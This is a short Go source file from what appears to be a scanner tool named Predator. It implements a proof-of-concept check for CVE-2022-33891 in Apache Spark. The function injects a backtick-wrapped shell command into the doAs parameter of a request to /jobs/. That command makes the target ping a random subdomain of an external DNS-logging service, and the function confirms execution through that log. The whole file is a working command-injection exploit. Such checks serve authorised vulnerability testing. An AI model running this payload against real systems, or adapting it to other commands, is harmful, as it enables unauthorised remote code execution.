package spark

import (
	"Predator/pkg/config"
	"Predator/pkg/utils"
	"fmt"
	"time"
)

func CVE_2022_33891(u string) bool {
	if config.CeyeApi != "" && config.CeyeDomain != "" {
		randomstr := utils.RandomStr()
		payload := fmt.Sprintf("doAs=`ping%%20%s`", randomstr+"."+config.CeyeDomain)
		utils.HttpRequset(u+"/jobs/?"+payload, "GET", "", false, nil)
		time.Sleep(5 * time.Second)
		if utils.Dnslogchek(randomstr) {
			return true
		}
	}
	return false
}
